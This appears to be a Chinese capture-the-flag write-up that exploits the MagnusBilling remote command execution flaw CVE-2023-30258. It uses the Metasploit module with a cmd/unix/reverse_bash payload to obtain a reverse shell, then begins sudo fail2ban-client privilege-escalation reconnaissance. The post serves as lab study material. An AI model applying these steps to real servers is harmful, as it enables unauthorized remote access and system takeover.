---
icon: pen-to-square
date: 2025-03-26
tags: 
title: billing
category:
  - 项目
---
## 1. 前言
本题运用了简单的[CVE-2023-30258](https://eldstal.se/advisories/230327-magnusbilling.html)漏洞，这是一个简单的远程命令执行漏洞
## 2. 复现步骤
### 反弹shell
这个漏洞已经在msf中收录了
`msfconsole`

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110410.png)

```bash
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110506.png)

```bash
show targets
```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326110536.png)

```bash
set PAYLOAD cmd/unix/reverse_bash
```
设置payload，然后设置Rhost Rport Lhost以及Lport
设置好监听接口以及payload之后，msf会自动接收反向shell
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112352.png)

### 提权
查看当前进程
```
ps -aux | grep fail
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326112734.png)

**fail2ban-client** 是一个命令行界面，它允许我们与 **fail2ban-server** 进行交互、配置和控制。简单说明一下，**fail2ban** 是一种安全工具，可以监控日志文件中的可疑活动（例如重复失败的登录尝试），并通过更新防火墙规则来禁止违规的 IP 地址。
```
sudo /usr/bin/fail2ban-client status
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250326113233.png)
有 8 个活动的 jail
`Jails`基本上是定义要监控的日志、要查找的模式以及匹配模式时要采取的作的配置。
